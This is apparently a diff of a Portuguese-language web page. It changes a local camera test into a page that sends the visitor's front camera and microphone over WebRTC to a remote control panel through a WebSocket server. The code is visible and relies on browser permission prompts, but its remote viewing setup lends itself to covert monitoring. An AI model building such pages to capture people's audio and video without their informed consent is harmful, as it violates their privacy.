@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Teste de Câmera</title>
+    <title>Câmera</title>
 </head>
 
 <body>
 
-    <h1>Teste de câmera</h1>
+    <h1>Câmera</h1>
 
-    <p id="status">Aguardando permissão...</p>
+    <p id="status">Conectando ao servidor...</p>
 
     <video
         id="video"
@@ -24,31 +24,149 @@
         const video = document.getElementById("video");
         const status = document.getElementById("status");
 
-        async function iniciarCamera() {
+        const socket = new WebSocket(
+            "wss://casaco-mercedes.onrender.com"
+        );
+
+        let peer = null;
+        let stream = null;
+
+        socket.onopen = async () => {
+
+            status.textContent =
+                "Conectado. Solicitando câmera e microfone...";
+
+            socket.send(JSON.stringify({
+                tipo: "camera"
+            }));
 
             try {
 
-                const stream =
-                    await navigator.mediaDevices.getUserMedia({
-                        video: true,
-                        audio: false
-                    });
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user"
+                    },
+                    audio: true
+                });
 
                 video.srcObject = stream;
 
                 status.textContent =
-                    "Câmera autorizada e funcionando.";
+                    "Câmera e microfone autorizados.";
+
+                iniciarWebRTC();
 
             } catch (erro) {
 
                 console.error(erro);
 
                 status.textContent =
-                    "Permissão da câmera recusada ou indisponível.";
+                    "Permissão da câmera ou microfone recusada.";
             }
+        };
+
+        function iniciarWebRTC() {
+
+            peer = new RTCPeerConnection({
+                iceServers: [
+                    {
+                        urls: "stun:stun.l.google.com:19302"
+                    }
+                ]
+            });
+
+            stream.getTracks().forEach(track => {
+                peer.addTrack(track, stream);
+            });
+
+            peer.onicecandidate = evento => {
+
+                if (evento.candidate) {
+
+                    socket.send(JSON.stringify({
+                        tipo: "candidato",
+                        candidato: evento.candidate
+                    }));
+                }
+            };
         }
 
-        iniciarCamera();
+        socket.onmessage = async evento => {
+
+            const mensagem = JSON.parse(evento.data);
+
+            if (mensagem.tipo === "painel-pronto") {
+
+                if (!peer) return;
+
+                const oferta =
+                    await peer.createOffer();
+
+                await peer.setLocalDescription(oferta);
+
+                socket.send(JSON.stringify({
+                    tipo: "oferta",
+                    oferta: peer.localDescription
+                }));
+            }
+
+            if (mensagem.tipo === "resposta") {
+
+                if (!peer) return;
+
+                await peer.setRemoteDescription(
+                    mensagem.resposta
+                );
+            }
+
+            if (mensagem.tipo === "candidato") {
+
+                if (!peer) return;
+
+                try {
+                    await peer.addIceCandidate(
+                        mensagem.candidato
+                    );
+                } catch (erro) {
+                    console.error(erro);
+                }
+            }
+
+            if (mensagem.tipo === "encerrar") {
+
+                if (stream) {
+
+                    stream.getTracks().forEach(track => {
+                        track.stop();
+                    });
+                }
+
+                if (peer) {
+                    peer.close();
+                }
+
+                video.srcObject = null;
+
+                status.textContent =
+                    "Transmissão encerrada pelo painel.";
+            }
+        };
+
+        socket.onerror = () => {
+
+            status.textContent =
+                "Erro ao conectar ao servidor.";
+        };
+
+        socket.onclose = () => {
+
+            if (status.textContent !==
+                "Transmissão encerrada pelo painel.") {
+
+                status.textContent =
+                    "Conexão com o servidor encerrada.";
+            }
+        };
     </script>
 
 </body>
